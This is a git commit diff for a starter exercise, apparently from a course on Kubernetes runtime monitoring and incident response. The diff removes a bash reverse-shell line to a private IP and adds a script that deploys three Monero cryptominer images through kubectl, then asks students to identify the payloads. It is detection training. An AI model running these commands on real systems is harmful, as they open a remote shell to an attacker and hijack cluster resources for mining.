a09f6925a55d1a321c140dc18d85c53ee9e0d110
Nick <nreva@snap.com>
2021-05-04 16:21:41 -0700

    payload.sh

--- lesson-6-runtime-monitoring-and-incident-response/exercises/starter/payload.sh
+++ lesson-6-runtime-monitoring-and-incident-response/exercises/starter/payload.sh
@@ -1,1 +1,9 @@
-/bin/bash -i >& /dev/tcp/10.0.0.123/1111 0>&1
+#!/bin/bash
+#start monero_cpu_moneropool:latest
+kubectl run --kubeconfig kube_config_cluster.yml moneropool --image=servethehome/monero_cpu_moneropool:latest --replicas=1
+#start xmrpooldotnet
+kubectl run --kubeconfig kube_config_cluster.yml xmrpooldotnet --image=servethehome/monero_cpu_xmrpooldotnet:latest --replicas=1
+#start minergate
+kubectl run --kubeconfig kube_config_cluster.yml minergate --image=servethehome/monero_cpu_minergate:latest --replicas=1
+
+echo "Can you identify the payload(s)?"
